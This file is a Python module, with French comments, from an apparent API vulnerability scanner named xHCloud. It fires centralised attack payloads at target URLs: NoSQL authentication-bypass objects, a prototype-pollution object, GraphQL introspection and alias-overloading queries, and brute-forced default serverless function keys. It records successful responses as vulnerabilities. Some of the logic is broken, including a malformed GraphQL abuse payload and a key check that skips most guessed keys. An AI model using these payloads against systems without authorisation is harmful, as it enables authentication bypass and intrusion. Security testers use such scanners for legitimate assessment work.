import asyncio
import json
from urllib.parse import urljoin, urlparse
from typing import List, Dict, Any
from core.engine import XHCloudEngine
from core.ui import XHCloudDashboard

# ==============================================================================
# PAYLOADS CENTRALISÉS (Fusion de AzApi3c & Katchinas)
# ==============================================================================
PAYLOADS = {
    "nosql": [
        {"username": {"$ne": "null"}, "password": {"$ne": "null"}},
        {"username": {"$gt": ""}, "password": {"$gt": ""}},
        {"$where": "sleep(1000)"},
        {"user": {"__proto__": {"isAdmin": True}}} # Prototype Pollution
    ],
    "graphql_introspection": [
        {"query": "{__schema{types{name}}}"},
        {"query": "query { __typename }"}
    ],
    "graphql_abuse": [
        {"query": "query { " + " u" + str(i) + ": user(id: " + str(i) + ") {id} " for i in range(50)} # Alias Overloading
    ],
    "serverless_keys": ["master", "host", "default", "admin", "function", "system"]
}

class APIScanner:
    def __init__(self, engine: XHCloudEngine, dashboard: XHCloudDashboard):
        self.engine = engine
        self.dashboard = dashboard
        self.semaphore = asyncio.Semaphore(engine.config.config.get("threads", 50))

    async def scan_target(self, base_url: str):
        """Orchestre le scan complet d'un point d'entrée API."""
        parsed = urlparse(base_url)
        
        # 1. Détection & Scan GraphQL
        if "graphql" in base_url.lower() or parsed.path in ["/graphql", "/graphiql", "/playground"]:
            await self._check_graphql(base_url)
            
        # 2. Scan Serverless (Azure Functions, AWS Lambda URLs)
        if any(x in base_url for x in ["azurefunctions.net", "azurewebsites.net", "lambda-url.amazonaws.com"]):
            await self._check_serverless(base_url)
            
        # 3. Scan NoSQL / JSON Injection (sur les endpoints POST probables)
        await self._check_nosql_injection(base_url)

        # 4. Scan Azure AD / OpenID spécifique
        if "azure" in base_url.lower() or "microsoftonline" in base_url.lower():
            await self._check_azure_ad(base_url)

    async def _check_graphql(self, url: str):
        """Teste les vulnérabilités GraphQL (Introspection, Batch Abuse, Injection)."""
        async with self.semaphore:
            for payload in PAYLOADS["graphql_introspection"]:
                try:
                    response = await self.engine.client.post(
                        url, 
                        json=payload, 
                        headers={"Content-Type": "application/json"}
                    )
                    if response.status_code == 200:
                        data = response.json()
                        if "data" in data and "__schema" in str(data):
                            self.dashboard.add_vulnerability(
                                severity="High",
                                module="GraphQL",
                                target=url,
                                details="Introspection activée (Schema exposé)"
                            )
                        elif "errors" in data and any("syntax" in err.get("message", "").lower() for err in data["errors"]):
                            self.dashboard.add_vulnerability(
                                severity="Medium",
                                module="GraphQL",
                                target=url,
                                details="Erreur de syntaxe révélée (Fingerprinting possible)"
                            )
                except Exception:
                    pass

    async def _check_serverless(self, url: str):
        """Teste les clés de gestion et endpoints d'admin Serverless (AzFunctions)."""
        async with self.semaphore:
            admin_paths = ["/admin/functions", "/admin/host/status", "/api/"]
            
            for path in admin_paths:
                target = urljoin(url, path)
                for key in PAYLOADS["serverless_keys"]:
                    try:
                        headers = {
                            "x-functions-key": key,
                            "x-functions-host-key": key,
                            "User-Agent": "xHCloud/1.0"
                        }
                        response = await self.engine.client.get(target, headers=headers)
                        
                        # Si on a un 200 OK sur un endpoint admin avec une clé par défaut
                        if response.status_code == 200 and "host" in key:
                            self.dashboard.add_vulnerability(
                                severity="Critical",
                                module="Serverless",
                                target=target,
                                details=f"Clé de gestion serverless valide détectée : '{key}'"
                            )
                    except Exception:
                        pass

    async def _check_nosql_injection(self, url: str):
        """Teste les injections NoSQL et la pollution de prototype."""
        async with self.semaphore:
            # On teste uniquement si l'URL semble accepter du JSON (ou on force le test)
            for payload in PAYLOADS["nosql"]:
                try:
                    response = await self.engine.client.post(
                        url,
                        json=payload,
                        headers={"Content-Type": "application/json"}
                    )
                    # Détection basique de succès NoSQL (à affiner selon le contexte)
                    if response.status_code == 200:
                        text_lower = response.text.lower()
                        if any(kw in text_lower for kw in ["welcome", "success", "admin", "true", "password"]):
                            self.dashboard.add_vulnerability(
                                severity="High",
                                module="NoSQLi",
                                target=url,
                                details=f"Bypass d'authentification potentiel avec payload: {json.dumps(payload)}"
                            )
                except Exception:
                    pass

    async def _check_azure_ad(self, url: str):
        """Vérifie la configuration OpenID et les flux implicites (AzApi3c)."""
        async with self.semaphore:
            openid_url = urljoin(url, "/.well-known/openid-configuration")
            try:
                response = await self.engine.client.get(openid_url)
                if response.status_code == 200:
                    config = response.json()
                    vulns = []
                    if "authorization_endpoint" not in config:
                        vulns.append("Missing authorization_endpoint")
                    if "token_endpoint" not in config:
                        vulns.append("Missing token_endpoint")
                    
                    if vulns:
                        self.dashboard.add_vulnerability(
                            severity="Medium",
                            module="Azure AD",
                            target=openid_url,
                            details=f"Configuration OpenID incomplète: {', '.join(vulns)}"
                        )
            except Exception:
                pass
